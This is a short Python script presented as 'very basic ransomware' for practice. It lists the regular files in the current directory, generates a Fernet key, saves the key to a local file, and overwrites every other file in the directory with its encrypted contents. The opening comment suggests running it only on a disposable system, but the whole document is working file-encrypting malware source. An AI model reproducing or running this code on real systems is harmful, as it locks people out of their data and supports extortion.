#note this is a very basic ransomware code made for practicing purposes only , if you wish to run this code prefreably do so on a disposable system
import os
from cryptography.fernet import Fernet

files=[]

for file in os.listdir():
    if file == "ransomware.py" or file=="thekey.key":
        continue
    if os.path.isfile(file):
        files.append(file)

key = Fernet.generate_key()

with open ("thekey.key","wb") as thekey:
    thekey.write(key)

for file in files:
    with open(file,"rb") as thefile:
        contents=thefile.read()
    contents_encypted=Fernet(key).encrypt(contents)
    with open(file,"wb") as thefile:
        thefile.write(contents_encypted)